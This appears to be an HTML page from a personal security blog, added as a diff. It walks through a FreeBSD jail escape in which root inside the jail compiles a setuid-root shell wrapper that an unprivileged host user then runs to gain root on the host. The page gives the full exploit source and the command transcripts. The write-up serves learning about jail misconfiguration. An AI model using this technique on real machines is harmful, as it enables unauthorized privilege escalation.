@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" 
+          content="width=device-width, initial-scale=1.0">
+          <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Roboto:wght@400;700&family=Lato:wght@400;700&family=Source+Sans+Pro:wght@400;700&family=Muli:wght@400;700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="css/styles.css">
+        <title>ASX</title>
+    </head>
+    <body>
+        <div class="main">
+            <fieldset>
+                <span><p>Dark:</p>
+                <button id="dark" class="dark" onclick="myFunction()">0</button></span>
+                <div class="profile">
+                        <a href="home.html"><img src="asx.png" id ="profileImg"></a>
+                </div>
+                <div class="name">
+                    <h1>ASX</h1>
+                </div>
+                <div class="quote">
+                    <p id="quote"><strong></strong></p>
+                </div>
+                <div class="nav">
+                        <a href="posts.html">Posts</a>
+                        <a href="projects.html">Projects</a>
+                        <a href="about.html">About</a>
+                </div>
+                <div class="nav">
+                    <a href="https://github.com/wmi">Github</a>
+                    <a href="https://www.linkedin.com/in/remi-cantigneaux">LinkedIn</a>
+                </div>
+            </fieldset>
+            <fieldset><legend>Exclusive</legend>
+                <h1>Jail: The enigmatic cooperative rooting.</h1>
+                <h2>Resume</h2>
+                <p>The rooting and compromise of a FreeBSD machine was accomplished in close collaboration by the restricted user inside the jail and by the user outside the jail.</p>
+                <div class="show-more" id="show-more-1">
+                    <h2>Requirements</h2> 
+                        <li>Root account inside the jail</li>
+                        <li>Cooperative user account outside the jail</li>
+                        <li>C knowledge</li>
+                        <li>Permissions knowledge</li>
+                        <li>FreeBSD system knowledge</li>
+                        <li>Time to kill</li>
+                    </p>
+                    <h2>Exploit</h2>
+                    <p>Let’s start by entering the machine as a normal user.</p>
+                    <div class="code">
+                        <div class="command">
+                            <p>[asx@cortex]> ssh katty@192.168.52.137</p>
+                        </div>
+                        <div class="output">
+                            <pre>
+(katty@192.168.52.137) Password for katty@jail-escape:
+Last login: Wed Dec 20 14:49:47 2023 from 192.168.52.145
+FreeBSD 14.0-RELEASE-p3 (GENERIC) #0: Mon Dec 11 04:56:01 UTC 2023
+
+Welcome to FreeBSD!
+
+Release Notes, Errata: https://www.FreeBSD.org/releases/
+Security Advisories:   https://www.FreeBSD.org/security/
+FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
+FreeBSD FAQ:           https://www.FreeBSD.org/faq/
+Questions List:        https://www.FreeBSD.org/lists/questions/
+FreeBSD Forums:        https://forums.FreeBSD.org/
+
+Documents installed with the system are in the /usr/local/share/doc/freebsd/
+directory, or can be installed later with:  pkg install en-freebsd-doc
+For other languages, replace "en" with a language code like de or fr.
+
+Show the version of FreeBSD installed:  freebsd-version ; uname -a
+Please include that output and any error messages when posting questions.
+Introduction to manual pages:  man man
+FreeBSD directory layout:      man hier
+
+To change this login announcement, see motd(5).
+ln: /home/ftp/.sh_history: Permission denied
+ln: /home/steven/.sh_history: Permission denied
+ln: /root/.sh_history: Permission denied
+ln: /usr/jails/steven1/home/steven1/.sh_history: Permission denied
+ln: /usr/jails/steven1/root/.sh_history: Permission denied
+To change an environment variable in /bin/sh use:
+
+$ VARIABLE="value"
+$ export VARIABLE
+                            </pre>
+                        </div>
+                        <div class="command">
+                            <p>katty@jail-escape:~ $</p>
+                        </div>
+                    </div>
+                    <p>Log in as root user inside the jail.</p>
+                    <div class="code">
+                        <div class="command">
+                            <p>[asx@cortex]> ssh root@192.168.52.137</p>
+                        </div>
+                        <div class="output">
+                            <pre>
+(root@192.168.52.137) Password for root@jail-escape:
+(root@192.168.52.137) Password for root@jail-escape:
+                            </pre>
+                        </div>
+                    </div>
+                    <p>The problem is that despite the root account, we are locked in a jail with restricted access.</p>
+                    <div class="code">
+                        <div class="command">
+                            <p>root@jail-escape:~ # ls -la</p>
+                        </div>
+                        <div class="output">
+                            <pre>
+total 37
+drwxr-x---   3 root wheel    9 Dec 20 16:10 .
+drwxr-xr-x  14 root wheel   24 Dec 18 21:23 ..
+-rw-r--r--   2 root wheel 1011 Dec 17 23:04 .cshrc
+-rw-r--r--   1 root wheel   66 Dec 17 23:04 .k5login
+-rw-r--r--   1 root wheel  316 Dec 17 23:04 .login
+-rw-r--r--   2 root wheel  495 Dec 17 23:04 .profile
+lrwxr-xr-x   1 root wheel    9 Dec 20 16:10 .sh_history -> /dev/null
+-rw-r--r--   1 root wheel 1174 Dec 17 23:04 .shrc
+drwx------   2 root wheel    4 Dec 20 13:57 .ssh
+                            </pre>
+                        </div>
+                        <div class="command">
+                            <p>root@jail-escape:~ #</p>
+                        </div>
+                    </div>
+                    <p>For this exploit works we need a compiler in the host. "cc" is especially useful when gcc is not available on the host.</p>
+                    <div class="code">
+                        <div class="command">
+                            <p>root@jail-escape:/home/steven1/documents # which cc</p>
+                        </div>
+                        <div class="output">
+                            <p>/usr/bin/cc</p>
+                        </div>
+                    </div>
+                    <p>Time to write the exploit in c</p>
+                    <div class="code">
+                        <div class="command">
+                            <p>root@jail-escape:/home/steven1/documents # ee exploit.c</p>
+                        </div>
+                        <div class="command">
+                            <p>root@jail-escape:/home/steven1/documents # cat exploit.c</p>
+                        </div>
+                        <div class="output">
+                            <pre>
+#include &lt;stdlib.h&gt;
+
+int main(void) {
+    system("/bin/sh");
+}
+                            </pre>
+                        </div>
+                    </div>
+                    <p>Now we can set rights and compile.</p>
+                    <div class="code">
+                        <div class="command">
+                            <p>root@jail-escape:/home/steven1 # cd doc*</p>
+                            <p>root@jail-escape:/home/steven1/documents # which cc</p>
+                        </div>
+                        <div class="output">
+                            <pre>
+/usr/bin/cc
+                            </pre>
+                        </div>
+                        <div class="command">
+                            <p>root@jail-escape:/home/steven1/documents # cc exploit.c -o exploit</p>
+                            <p>root@jail-escape:/home/steven1/documents # chmod u+s exploit</p>
+                            <p>root@jail-escape:/home/steven1/documents # ls -la exploit</p>
+                        </div>
+                        <div class="output">
+                            <pre>
+-rwsr-xr-x  1 root steven1 9664 Dec 20 16:43 exploit
+                            </pre>
+                        </div>
+                    </div>
+                    <p>We are exploiting the setuid bit and bad environment configurations. Since the path to the created file is not restricted, if we run this root file in the jail, we will become root outside of the jail, and therefore on the host machine.</p>
+                    <div class="code">
+                        <div class="command">
+                            <p>katty@jail-escape:~ $ cd /usr/jails/steven1/home/steven1/documents/</p>
+                            <p>katty@jail-escape:/usr/jails/steven1/home/steven1/documents $ /bin/ls -la</p>
+                        </div>
+                        <div class="output">
+                            <pre>
+total 19
+drwxr-xr-x  2 katty   katty    5 Dec 20 16:43 .
+drwxr-xr-x  4 steven1 wheel   12 Dec 20 16:10 ..
+-rwsr-xr-x  1 root    katty 9664 Dec 20 16:43 exploit
+-rwSr--r--  1 root    katty   62 Dec 20 16:34 exploit.c
+                            </pre>
+                        </div>
+                    </div>
+                    <p>The trick is there we will run the file as external user from the jail</p>
+                    <div class="code">
+                        <div class="command">
+                            <p>katty@jail-escape:/usr/jails/steven1/home/steven1/documents $ ./exploit 
+                        </div>
+                        <div class="output">
+                            <pre>
+#
+                            </pre>
+                        </div>
+                        <div class="command">
+                            <p># /usr/bin/whoami; /usr/bin/id</p>
+                        </div>
+                        <div class="output">
+                            <pre>
+root
+uid=1001(katty) gid=1001(katty) euid=0(root) groups=1001(katty)
+                            </pre>
+                        </div>
+                        <div class="command">
+                            <p># cd /root</p>
+                            <p># /bin/ls</p>
+                        </div>
+                        <div class="output">
+                            <pre>
+outside-jail.txt    scripts
+                            </pre>
+                        </div>
+                        <div class="command">
+                            <p># ezjail-admin list</p>
+                        </div>
+                        <div class="output">
+                            <pre>
+STA JID  IP              Hostname                       Root Directory
+--- ---- --------------- ------------------------------ ------------------------
+DR  1    192.168.0.10    jail-escape                    /usr/jails/steven1
+                            </pre>
+                        </div>
+                    </div>
+                    <p>We have successfuly switched root privileges. Which concludes that with a little cooperation you can gain privileges on a freeBSD machine</p>
+                    <h2>Conclusion</h2>
+                    <p>We managed to escape from the jail in the latest version of FreeBSD using the techniques of using living of the land and external user! Note that the conditions to meet are quite rare cases.</p>
+                </div>
+                <div class="info">
+                    <p>FreeBSD</p><p>Jail</p><p>Exploit</p>
+                </div><input classe="fleche bas" id="button-more" type="button" value="&#9660;">
+            </fieldset>
+        </div>
+        <script src="script.js"></script>
+    </body>
+</html>
